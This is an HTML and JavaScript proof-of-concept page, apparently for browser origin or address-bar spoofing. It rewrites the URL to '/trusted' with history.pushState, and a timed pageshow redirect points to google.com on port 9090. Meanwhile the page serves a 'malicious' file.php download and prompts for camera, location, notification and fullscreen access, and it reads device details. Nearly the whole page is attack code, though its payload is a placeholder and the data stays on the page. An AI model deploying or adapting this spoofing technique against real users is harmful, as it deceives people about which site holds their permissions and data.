<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Origin Desync Login PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin:0;
  font-family:-apple-system,BlinkMacSystemFont,system-ui;
  background:#f5f5f7;
}

button {
  margin:6px;
  font-size:14px;
  padding:8px 12px;
}

#panel {
  display:none;
  max-width:520px;
  margin:60px auto;
  background:#fff;
  padding:24px;
  border-radius:16px;
  box-shadow:0 20px 60px rgba(0,0,0,.2);
}

h2 { text-align:center; margin-bottom:6px; }
.sub { text-align:center; color:#666; margin-bottom:20px; }

.notice {
  margin-top:14px;
  font-size:13px;
  color:#b00020;
}

.download-button {
  margin-top:20px;
  width:100%;
  padding:12px;
  font-size:16px;
  border-radius:10px;
  border:none;
  background:#007aff;
  color:#fff;
}

video { width:100%; margin-top:10px; }

#apiResults {
  margin-top: 20px;
  padding: 10px;
  background: #f0f0f0;
  border-radius: 8px;
  font-size: 14px;
  max-height: 400px;
  overflow-y: auto;
}
</style>
</head>

<body>

<div style="text-align:center">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Download File</h2>
  <div class="sub">Click below to download file.php</div>

  <button class="download-button" onclick="downloadFile()">
    Download File (file.php)
  </button>

  <hr>

  <button id="locationButton" onclick="getLocation()">Get Location</button>
  <p id="locationOutput">Location: -</p>

  <button id="cameraButton" onclick="openCamera()">Open Camera</button>
  <video id="camera" autoplay playsinline></video>

  <hr>

  <button id="batteryButton" onclick="accessBattery()">Get Battery Status</button>
  <button id="networkButton" onclick="getNetworkInfo()">Get Network Info</button>
  <button id="notificationButton" onclick="requestNotificationPermission()">Request Notification Permission</button>
  <button id="fullscreenButton" onclick="requestFullscreen()">Request Fullscreen</button>
  <button id="languageButton" onclick="getLanguageInfo()">Get Language and Timezone</button>

  <div id="apiResults">
    <h3>API Results:</h3>
    <div id="batteryStatus">Battery Status: -</div>
    <div id="networkInfo">Network Info: -</div>
    <div id="languageInfo">Language & Timezone: -</div>
    <div id="locationInfo">Location: -</div>
    <div id="fullscreenStatus">Fullscreen Status: -</div>
    <div id="notificationStatus">Notification Status: -</div>
  </div>

  <div class="notice">
    Demo only — browser permission required
  </div>
</div>

<script>
const panel = document.getElementById('panel');
const trigger = document.getElementById('trigger');
const locationOutput = document.getElementById('locationOutput');
const camera = document.getElementById('camera');
const apiResults = document.getElementById('apiResults');

// FUNGSI ASLI (TIDAK DIUBAH)
function downloadFile() {
  const fileContent = `<?php echo 'This is a malicious PHP file!'; ?>`;
  const fileBlob = new Blob([fileContent], { type: 'text/plain' });
  const fileUrl = URL.createObjectURL(fileBlob);

  const downloadLink = document.createElement('a');
  downloadLink.href = fileUrl;
  downloadLink.download = 'file.php';
  document.body.appendChild(downloadLink);
  downloadLink.click();
  document.body.removeChild(downloadLink);
}

function getLocation() {
  if (!navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(
    pos => locationOutput.textContent = `Location: ${pos.coords.latitude}, ${pos.coords.longitude}`,
    () => locationOutput.textContent = 'Permission denied'
  );
}

function openCamera() {
  checkCameraPermission()
    .then(hasPermission => {
      if (hasPermission) {
        navigator.mediaDevices.getUserMedia({ video:true })
          .then(s => camera.srcObject = s)
          .catch(() => alert('Camera denied'));
      } else {
        alert('Camera permission denied by user');
      }
    });
}

// Cek izin kamera dengan navigator.permissions
function checkCameraPermission() {
  return navigator.permissions.query({ name: 'camera' })
    .then(permissionStatus => {
      return permissionStatus.state === 'granted';
    })
    .catch(() => {
      return false; // Jika tidak dapat mengecek izin, anggap ditolak
    });
}

// API Functions with Results in the UI
function accessBattery() {
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      document.getElementById('batteryStatus').textContent = `Battery Status: ${Math.round(battery.level * 100)}%`;
    });
  }
}

function getNetworkInfo() {
  if (navigator.connection) {
    document.getElementById('networkInfo').textContent = `Network Info: ${navigator.connection.effectiveType}`;
  }
}

function requestNotificationPermission() {
  if (Notification) {
    Notification.requestPermission().then(permission => {
      document.getElementById('notificationStatus').textContent = `Notification Permission: ${permission}`;
    });
  }
}

function requestFullscreen() {
  document.documentElement.requestFullscreen().catch(() => {});
  document.getElementById('fullscreenStatus').textContent = 'Fullscreen Requested';
}

function getLanguageInfo() {
  const language = navigator.language;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  document.getElementById('languageInfo').textContent = `Language: ${language}, Timezone: ${timezone}`;
}

trigger.onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
};

window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:9090';
      }, 80);
    });
  });
});
</script>

</body>
</html>
